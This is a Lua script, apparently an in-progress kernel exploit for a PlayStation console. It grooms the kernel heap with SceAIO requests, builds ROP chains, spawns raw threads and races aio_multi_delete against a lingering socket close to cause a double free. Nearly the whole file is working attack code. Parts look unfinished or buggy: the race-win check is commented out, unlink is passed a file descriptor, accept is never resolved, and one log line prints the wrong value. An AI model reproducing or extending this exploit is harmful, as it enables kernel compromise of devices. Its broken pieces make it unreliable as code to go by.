
syscall.resolve({
    unlink = 0xa,

    socket = 0x61,
    connect = 0x62,
    bind = 0x68,
    setsockopt = 0x69,
    listen = 0x6a,
    
    getsockopt = 0x76,
    socketpair = 0x87,
    thr_exit = 0x1af,
    sched_yield = 0x14b,
    thr_new = 0x1c7,
    cpuset_getaffinity = 0x1e7,
    cpuset_setaffinity = 0x1e8,
    rtprio_thread = 0x1d2,
    
    thr_suspend_ucontext = 0x278,
    thr_resume_ucontext = 0x279,

    aio_multi_delete = 0x296,
    aio_multi_wait = 0x297,
    aio_multi_pool = 0x298,
    aio_multi_cancel = 0x29b,
    aio_submit_cmd = 0x29d
})




DEBUG = true



-- misc functions

function dbg(s)
    if DEBUG then
        print(s)
    end
end

function dbgf(...)
    if DEBUG then
        dbg(string.format(...))
    end
end






-- cpu related functions

function pin_to_core(core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    return syscall.cpuset_setaffinity(level, which, id, setsize, mask)
end

function get_core_index(mask_addr)
    local num = memory.read_dword(mask_addr):tonumber()
    local position = 0
    while num > 0 do
        num = bit32.rshift(num, 1)
        position = position + 1
    end
    return position - 1
end

function get_current_core()
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    syscall.cpuset_getaffinity(level, which, id, 0x10, mask)
    return get_core_index(mask)
end

function rtprio(type, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio or 0)  -- current_prio
    syscall.rtprio_thread(type, 0, rtprio):tonumber()
    if type == RTP_LOOKUP then
        return memory.read_word(rtprio + 0x2):tonumber() -- current_prio
    end
end

function set_rtprio(prio)
    rtprio(RTP_SET, prio)
end

function get_rtprio()
    return rtprio(RTP_LOOKUP)
end

-- rop functions

function rop_get_current_core(chain, mask)
    local level = 3
    local which = 1
    local id = -1
    chain:push_syscall(syscall.cpuset_getaffinity, level, which, id, 0x10, mask)
end

function rop_pin_to_core(chain, core)
    local level = 3
    local which = 1
    local id = -1
    local setsize = 0x10
    local mask = memory.alloc(0x10)
    memory.write_word(mask, bit32.lshift(1, core))
    chain:push_syscall(syscall.cpuset_setaffinity, level, which, id, setsize, mask)
end

function rop_set_rtprio(chain, prio)
    local PRI_REALTIME = 2
    local rtprio = memory.alloc(0x4)
    memory.write_word(rtprio, PRI_REALTIME)
    memory.write_word(rtprio + 0x2, prio)
    chain:push_syscall(syscall.rtprio_thread, 1, 0, rtprio)
end

-- spin until comparison is false
function rop_wait_for(chain, value_address, op, compare_value)
    chain:gen_loop(value_address, op, compare_value, function()
        chain:push_syscall(syscall.sched_yield)
    end)
end



--
-- primitive thread class
--
-- use thr_new to spawn new thread
--
-- only bare syscalls are supported. any attempt to call into few libc 
-- fns (such as printf/puts) will result in a crash
--

prim_thread = {}
prim_thread.__index = prim_thread

function prim_thread.init()

    local setjmp = fcall(libc_addrofs.setjmp)
    local jmpbuf = memory.alloc(0x60)
    
    -- get existing regs state
    setjmp(jmpbuf)

    prim_thread.fpu_ctrl_value = memory.read_dword(jmpbuf + 0x40)
    prim_thread.mxcsr_value = memory.read_dword(jmpbuf + 0x44)

    prim_thread.initialized = true
end

function prim_thread:prepare_structure()

    local jmpbuf = memory.alloc(0x60)

    -- skeleton jmpbuf
    memory.write_qword(jmpbuf, gadgets["ret"]) -- ret addr
    memory.write_qword(jmpbuf + 0x10, self.chain.stack_base) -- rsp - pivot to ropchain
    memory.write_dword(jmpbuf + 0x40, prim_thread.fpu_ctrl_value) -- fpu control word
    memory.write_dword(jmpbuf + 0x44, prim_thread.mxcsr_value) -- mxcsr

    -- prep structure for thr_new

    local stack_size = 0x400
    local tls_size = 0x40
    
    self.thr_new_args = memory.alloc(0x80)
    self.tid_addr = memory.alloc(0x8)

    local cpid = memory.alloc(0x8)
    local stack = memory.alloc(stack_size)
    local tls = memory.alloc(tls_size)

    memory.write_qword(self.thr_new_args, libc_addrofs.longjmp) -- fn
    memory.write_qword(self.thr_new_args + 0x8, jmpbuf) -- arg
    memory.write_qword(self.thr_new_args + 0x10, stack)
    memory.write_qword(self.thr_new_args + 0x18, stack_size)
    memory.write_qword(self.thr_new_args + 0x20, tls)
    memory.write_qword(self.thr_new_args + 0x28, tls_size)
    memory.write_qword(self.thr_new_args + 0x30, self.tid_addr) -- child pid
    memory.write_qword(self.thr_new_args + 0x38, cpid) -- parent tid

    self.ready = true
end


function prim_thread:new(chain)

    if not prim_thread.initialized then
        prim_thread.init()
    end

    if not chain.stack_base then
        error("`chain` argument must be a ropchain() object")
    end

    -- exit ropchain once finished
    chain:push_syscall(syscall.thr_exit, 0)

    local self = setmetatable({}, prim_thread)    
    
    self.chain = chain

    return self
end

-- run ropchain in primitive thread
function prim_thread:run()

    if not self.ready then
        self:prepare_structure()
    end

    -- spawn new thread
    if syscall.thr_new(self.thr_new_args, 0x68):tonumber() == -1 then
        error("thr_new() error: " .. get_error_string())
    end

    self.ready = false
    self.tid = memory.read_qword(self.tid_addr):tonumber()
    
    return self.tid
end



AF_UNIX = 1
AF_INET = 2
AF_INET6 = 28

-- globals.lua
SOCK_STREAM = 1
SOCK_DGRAM = 2
IPPROTO_UDP = 17
IPPROTO_IPV6 = 41
IPV6_PKTINFO = 46
INADDR_ANY = 0

SOL_SOCKET = 0xffff
SO_LINGER = 0x80
--

AIO_CMD_READ = 1
AIO_CMD_WRITE = 2
AIO_CMD_FLAG_MULTI = 0x1000
AIO_CMD_MULTI_READ = bit32.bor(AIO_CMD_FLAG_MULTI, AIO_CMD_READ)
AIO_STATE_COMPLETE = 3
AIO_STATE_ABORTED = 4


MAIN_CORE = 7
MAIN_RTPRIO = 0x100
AIO_MULTI_DELETE_CORE = 7

NUM_WORKERS = 2
NUM_GROOMS = 0x200
NUM_HANDLES = 0x100
NUM_RACES = 100
NUM_SDS = 0x100

IPPROTO_TCP = 6
TCP_INFO = 0x20
size_tcp_info = 0xec

-- max number of requests that can be created/polled/canceled/deleted/waited
MAX_AIO_IDS = 0x80

-- the various SceAIO syscalls that copies out errors/states will not check if
-- the address is NULL and will return EFAULT. this dummy buffer will serve as
-- the default argument so users don't need to specify one
AIO_ERRORS = memory.alloc(4 * MAX_AIO_IDS)







-- multi aio related functions


-- int aio_submit_cmd(
--     u_int cmd,
--     SceKernelAioRWRequest reqs[],
--     u_int num_reqs,
--     u_int prio,
--     SceKernelAioSubmitId ids[]
-- );
function aio_submit_cmd(cmd, reqs, num_reqs, ids)
    return syscall.aio_submit_cmd(cmd, reqs, num_reqs, 3, ids):tonumber()
end

-- int aio_multi_delete(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int sce_errors[]
-- );
function aio_multi_delete(ids, num_ids, states)
    states = states or AIO_ERRORS
    return syscall.aio_multi_delete(ids, num_ids, states):tonumber()
end

-- int aio_multi_poll(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[]
-- );
function aio_multi_poll(ids, num_ids, states)
    states = states or AIO_ERRORS
    return syscall.aio_multi_pool(ids, num_ids, states):tonumber()
end

-- int aio_multi_cancel(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[]
-- );
function aio_multi_cancel(ids, num_ids, states)
    states = states or AIO_ERRORS
    return syscall.aio_multi_cancel(ids, num_ids, states):tonumber()
end

-- int aio_multi_wait(
--     SceKernelAioSubmitId ids[],
--     u_int num_ids,
--     int states[],
--     // SCE_KERNEL_AIO_WAIT_*
--     uint32_t mode,
--     useconds_t *timeout
-- );
function aio_multi_wait(ids, num_ids, states, mode, timeout)

    states = states or AIO_ERRORS
    mode = mode or 1
    timeout = timeout or 0

    return syscall.aio_multi_wait(ids, num_ids, states, mode, timeout):tonumber()
end

function new_socket()
    return syscall.socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP):tonumber()
end

function new_tcp_socket()
    return syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
end

function gsockopt(sd, level, optname, optval, optlen)
    local size = memory.alloc(4 * optlen)

    syscall.getsockopt(sd, level, optname, optval, size)
    return memory.read_dword(size):tonumber()
end

function make_reqs1(num_reqs)
    local reqs1 = memory.alloc(0x28 * num_reqs)
    for i=0,num_reqs-1 do
        memory.write_dword(reqs1 + i*0x28 + 0x20, -1)  -- fd
    end
    return reqs1
end

function spray_aio(loops, reqs1, num_reqs, ids, multi, cmd)
    
    loops = loops or 1
    cmd = cmd or AIO_CMD_READ
    if multi == nil then multi = true end

    local step = 4 * (multi and num_reqs or 1)
    cmd = bit32.bor(cmd, (multi and AIO_CMD_FLAG_MULTI or 0))
    
    local idx = 0
    for i=0, loops-1 do
        aio_submit_cmd(cmd, reqs1, num_reqs, ids + idx)
        idx = idx + step
    end
end

function poll_aio(ids, states, num_ids)
    aio_multi_poll(ids, num_ids, states)
end

function cancel_aios(ids, num_ids)

    local len = MAX_AIO_IDS
    local rem = num_ids % len
    local num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        aio_multi_cancel(ids + (i*4*len), len)
    end

    if rem > 0 then
        aio_multi_cancel(ids + (num_batches*4*len), rem)
    end
end

-- note: free_aios2 is `do_cancel = false`
function free_aios(ids, num_ids, do_cancel)

    if do_cancel == nil then do_cancel = true end

    local len = MAX_AIO_IDS
    local rem = num_ids % len
    local num_batches = (num_ids - rem) / len

    for i=0, num_batches-1 do
        local addr = ids + (i*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        end
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    end

    if rem > 0 then
        local addr = ids + (num_batches*4*len)
        if do_cancel then
            aio_multi_cancel(addr, len)
        end
        aio_multi_poll(addr, len)
        aio_multi_delete(addr, len)
    end
end



-- exploit related functions

function setup(block_fd)

    -- 1. block AIO

    -- this part will block the worker threads from processing entries so that we may cancel them instead.
    -- this is to work around the fact that aio_worker_entry2() will fdrop() the file associated with the aio_entry on ps5.
    -- we want aio_multi_delete() to call fdrop()

    local reqs1 = memory.alloc(0x28 * NUM_WORKERS)
    local block_id = memory.alloc(4)

    for i=0,NUM_WORKERS-1 do
        memory.write_dword(reqs1 + i*0x28 + 8, 1)  -- nbyte
        memory.write_dword(reqs1 + i*0x28 + 0x20, block_fd)  -- fd
    end

    aio_submit_cmd(AIO_CMD_READ, reqs1, NUM_WORKERS, block_id)

    -- 2. verify if aio can be blocked

    if true then

        local reqs1 = make_reqs1(1)
        local timeout = memory.alloc(4)
        local id = memory.alloc(4)
    
        memory.write_dword(timeout, 1)
    
        aio_submit_cmd(AIO_CMD_READ, reqs1, 1, id)
        aio_multi_wait(id, 1, AIO_ERRORS, 1, timeout)

        local error_func = fcall(libc_addrofs.error)
        local errno = memory.read_qword(error_func()):tonumber()

        if errno ~= 60 then -- ETIMEDOUT
            errorf("SceAIO system not blocked. errno %s", hex(errno))
        end

        free_aios(id, 1)
    end

    -- 3. heap grooming

    -- chosen to maximize the number of 0x80 malloc allocs per submission
    local num_reqs = 3
    local groom_ids = memory.alloc(4 * NUM_GROOMS)
    local greqs = make_reqs1(num_reqs)

    -- allocate enough so that we start allocating from a newly created slab
    spray_aio(NUM_GROOMS, greqs, num_reqs, groom_ids, false)
    cancel_aios(groom_ids, NUM_GROOMS)

    return block_id, groom_ids
end

start_signal = memory.alloc(0x8)
exit_signal = memory.alloc(0x8)
resume_signal = memory.alloc(0x8)

function reset_race_state()
    
    -- clean up race states
    memory.write_qword(start_signal, 0)
    memory.write_qword(exit_signal, 0)
    memory.write_qword(resume_signal, 0)
end

function prepare_aio_multi_delete_rop(request_addr, sce_errs)

    local chain = ropchain()

    rop_pin_to_core(chain, AIO_MULTI_DELETE_CORE)
    rop_set_rtprio(chain, MAIN_RTPRIO)

    -- wait until it receives signal to resume
    rop_wait_for(chain, start_signal, "==", 0)

    -- do aio delete operation
    chain:push_syscall(syscall.aio_multi_delete, request_addr, 1, sce_errs+4)

    return chain
end

function race_one(request_addr, tcp_sd, barrier, racer, sds)
    reset_race_state()

    local sce_errs = memory.alloc(8)
    memory.write_dword(sce_errs, -1)
    memory.write_dword(sce_errs+4, -1)
    
    local chain = prepare_aio_multi_delete_rop(request_addr, sce_errs)
    local thr = prim_thread:new(chain)
    thr:prepare_structure()
    local thr_tid = thr:run()

    printf("Race one thread ID: %d", thr_tid)
    memory.write_qword(start_signal, 1)

    local suspend = syscall.thr_suspend_ucontext(thr_tid):tonumber()
    printf("suspend %d: %d", thr_tid, suspend)

    local won_race = false

    local poll_err = memory.alloc(8);
    aio_multi_poll(request_addr, 1, poll_err)
    local poll_res = memory.read_dword(poll_err):tonumber()
    printf("poll: %x", poll_res)

    local info_buf = memory.alloc(2*size_tcp_info)
    local info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, size_tcp_info)
    printf("info size: %x", info_size)

    
    printf("tcp state: %d", memory.read_dword(info_buf):tonumber())
    if info_size ~= size_tcp_info then
        dbgf("info size isn't " .. size_tcp_info .. ": " .. info_size)
    end

    local SCE_KERNEL_ERROR_ESRCH = 0x80020003
    -- if poll_res ~= SCE_KERNEL_ERROR_ESRCH then
    --     aio_multi_delete(request_addr, 1, sce_errs)
    --     won_race = true
    -- end

    local resume = syscall.thr_resume_ucontext(thr_tid):tonumber()
    printf("resume %d: %d", thr_tid, suspend)

    printf("race errors: 0x%x, 0x%x", memory.read_dword(sce_errs):tonumber(), memory.read_dword(sce_errs+4):tonumber())
    
end

function double_free_reqs2(sds)
    local function htons(port)
        return bit32.bor(bit32.lshift(port, 8), bit32.rshift(port, 8)) % 0x10000
    end

    -- TODO: Find another path
    -- local socket_path = "/mnt/sandbox/socket"
    local socket_path = "/av_contents/content_tmp/socket" -- jb ps4
    
    local server_addr = memory.alloc(128)
    local addrlen = memory.alloc(8)
    memory.write_byte(server_addr + 1, AF_UNIX)
    
    -- Write socket path to the structure
    for i = 1, #socket_path do
        memory.write_byte(server_addr + 2 + (i-1), string.byte(socket_path, i))
    end
    memory.write_byte(server_addr + 2 + #socket_path, 0)  -- Add null terminator
    
    local addr_size = 2 + #socket_path + 1  -- family byte + path + null terminator
    
    local barrier = memory.alloc(8)
    -- pthread_barrier_init(barrier, 0, 2)

    local num_reqs = 3
    local which_req = num_reqs - 1
    local reqs1 = make_reqs1(num_reqs)
    local aio_ids = memory.alloc(4 * num_reqs)
    local req_addr = aio_ids + (4 * which_req)
    local cmd = AIO_CMD_MULTI_READ

    syscall.unlink(socket_path)

    local server_fd = syscall.socket(AF_UNIX, SOCK_STREAM, 0):tonumber()
    if server_fd < 0 then
        error("socket() error: " .. get_error_string())
    end
    
    if syscall.bind(server_fd, server_addr, addr_size):tonumber() < 0 then
        error("bind() error: " .. get_error_string())
    end
 
    if syscall.listen(server_fd, 1):tonumber() < 0 then
        error("listen() error: " .. get_error_string())
    end

    -- NUM_RACES = 20
    for i=1,NUM_RACES do
        print()
        printf("== attempt #%d ==", i)
        print()

        local client_fd = syscall.socket(AF_UNIX, SOCK_STREAM, 0):tonumber()
        if client_fd < 0 then
            error("socket() error: " .. get_error_string())
        end

        if syscall.connect(client_fd, server_addr, addr_size):tonumber() < 0 then
            error("connect() error: " .. get_error_string())
        end

        local conn_fd = syscall.accept(server_fd, 0, 0):tonumber()
        if conn_fd < 0 then
            print("accept() error: " .. get_error_string())
        end

        -- force soclose() to sleep
        local tmp_buffer = memory.alloc(8)
        memory.write_dword(tmp_buffer, 1)
        memory.write_dword(tmp_buffer+4, 1)

        if syscall.setsockopt(client_fd, SOL_SOCKET, SO_LINGER, tmp_buffer, 8):tonumber() < 0 then
            print("setsockopt() error: " .. get_error_string())
        end
        memory.write_dword(reqs1 + (which_req*0x28) + 0x20, client_fd)

        aio_submit_cmd(cmd, reqs1, num_reqs, aio_ids)
        aio_multi_cancel(aio_ids, num_reqs)
        aio_multi_poll(aio_ids, num_reqs)

        -- drop the reference so that aio_multi_delete() will trigger _fdrop()
        syscall.close(client_fd)
        local res = race_one(req_addr, conn_fd, barrier, sds)

        -- MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
        -- twice. this will leave one request undeleted
        aio_multi_delete(aio_ids, num_reqs)
        syscall.close(conn_fd)

        if res then
            printf('won race at attempt: %d', i)
            syscall.close(server_fd)
            syscall.unlink(server_fd)
            -- pthread_barrier_destroy(barrier)
            return res
        end
    end

    -- Clean up the socket file when done
    -- TODO: Delete
    syscall.close(server_fd)
    syscall.unlink(server_fd)
    
    error('failed aio double free')
end

function kexploit()

    -- pin to 1 core so that we only use 1 per-cpu bucket.
    -- this will make heap spraying and grooming easier
    pin_to_core(MAIN_CORE)
    set_rtprio(MAIN_RTPRIO)

    printf("pinning to core %d with prio %d", get_current_core(), get_rtprio())

    local sockpair = memory.alloc(8)
    local sock_fds = {}

    if syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair):tonumber() == -1 then
        error("socketpair() error: " .. get_error_string())
    end

    local block_fd = memory.read_dword(sockpair):tonumber()
    local unblock_fd = memory.read_dword(sockpair + 4):tonumber()

    dbgf("block_fd %d unblocked_fd %d", block_fd, unblock_fd)

    for i=1,NUM_SDS do
        local sock_fd = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
        table.insert(sock_fds, sock_fd)
    end

    print("[+] Setup")
    local block_id, groom_ids = setup(block_fd)

    dbgf("block_id %s groom_ids %s", hex(block_id), hex(groom_ids))

    print("[+] Double-free AIO")
    local sd_pair = double_free_reqs2(sock_fds)

end


kexploit()

